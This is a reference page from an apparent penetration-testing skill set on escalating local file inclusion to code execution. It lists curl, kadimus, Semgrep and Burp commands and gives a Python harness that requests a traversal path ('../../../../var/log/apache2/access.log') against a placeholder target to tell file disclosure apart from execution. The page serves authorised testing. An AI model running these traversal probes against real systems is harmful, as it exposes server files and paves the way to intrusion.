# Tools, CLI Flags, and SDK Reference

> Sub-skill: [`path-traversal-and-lfi-lfi-to-rce`](SKILL.md) | Family: **Web and Application**

Flags below are the ones this technique actually needs. Verify with `--help` on your installed version before relying on an exact spelling.

## Tool and Command Matrix

| Tool / Package | Verified Command or Entry Point | Purpose | Platforms |
|---|---|---|---|
| `curl` | `curl -sS -o /dev/null -w '%{size_download}\n' 'https://target.example/index.php?view=home'` | Record the inert-read response size that the poisoned-sink probe is compared against | Cross-platform |
| `kadimus` | `kadimus -u 'https://target.example/?view=FUZZ' --parameter view` | Enumerate includable paths and wrapper handling with non-destructive read probes | Linux |
| `Semgrep` | `semgrep -e 'include($X)' -e 'require($X)' -l php .` | Locate dynamic include or require sites where the argument is not a string literal | Cross-platform |
| `Burp Suite Repeater` | `Send the benign-path and poisoned-log requests to Repeater and compare on one connection` | Keeps the interpret-versus-read differential on a single connection so timing and caching do not confuse it | Cross-platform |

## Minimal Script Shape

A read-versus-interpret harness: it fetches a benign include path and a poisoned sink path pre-seeded with an inert marker, then reports whether the marker was returned as text (inclusion read) or evaluated (execution).

```python
import urllib.parse
import urllib.request

BASE = "https://target.example/index.php"
PARAM = "view"
MARKER = "ptlfirce-marker"

def read(value):
    url = BASE + "?" + urllib.parse.urlencode({PARAM: value})
    req = urllib.request.Request(url, headers={"User-Agent": "authorised-assessment"})
    with urllib.request.urlopen(req, timeout=10) as r:
        return r.read().decode("utf-8", "replace")

benign = read("home")
sink = read("../../../../var/log/apache2/access.log")
disclosed = MARKER in sink
interpreted = (MARKER not in sink) and ("evaluated" in sink.lower())
print({"benign_len": len(benign), "disclosed_as_text": disclosed,
       "appears_interpreted": interpreted,
       "verdict": "RCE" if interpreted else ("inclusion-read" if disclosed else "no-signal")})
```
